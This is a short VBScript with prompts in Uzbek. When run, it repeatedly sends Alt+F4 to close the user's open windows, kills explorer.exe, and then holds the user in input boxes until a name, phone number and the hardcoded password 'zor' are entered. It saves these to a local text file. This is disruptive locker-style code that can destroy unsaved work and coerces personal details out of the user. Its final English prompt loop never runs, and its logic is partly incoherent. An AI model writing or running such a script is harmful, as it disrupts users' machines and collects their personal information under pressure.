Dim objFSO, objFile
Dim name, phoneNumber, password
Set WshShell = WScript.CreateObject("WScript.Shell")
Dim oShell : Set oShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Dim filename
filename = "userinfo_" & Replace(Replace(Replace(Now(), ":", ""), "/", ""), " ", "") & ".txt"
For i = 1 To 20 
    WshShell.SendKeys "%{TAB}"  
    WScript.Sleep 250
    WshShell.SendKeys "%{F4}"
    WScript.Sleep 250
Next
oShell.Run "taskkill /f /im explorer.exe", , True
WScript.Sleep 250
oShell.Run "taskkill /f /im explorer.exe", , True
WScript.Sleep 250
For i = 1 To 5 
    WshShell.SendKeys "%{TAB}"  
    WScript.Sleep 250
    WshShell.SendKeys "%{F4}"
    WScript.Sleep 250
Next



Do Until name <> ""
    name = InputBox("Ismingni Kirit:")
Loop

Do Until phoneNumber <> ""
    phoneNumber = InputBox("Telefon Raqamingni Kirit:")
Loop


Do While password <> "zor"
    password = InputBox("Parolni Kirit:")
Loop


Set objFile = objFSO.CreateTextFile(filename, True)


objFile.WriteLine "Name: " & name
objFile.WriteLine "Phone Number: " & phoneNumber
objFile.WriteLine "Password: " & password


objFile.Close


oShell.Run "start explorer.exe", , True
MsgBox "Sizni Malumotlarngiz Muvafaqiyaltli Saqlandi!"

Set objFile = Nothing
Set objFSO = Nothing


Do Until name <> "" And phoneNumber <> "" And password <> ""
    name = InputBox("Enter your name:")
    phoneNumber = InputBox("Enter your phone number:")
    password = InputBox("Enter your password:")
Loop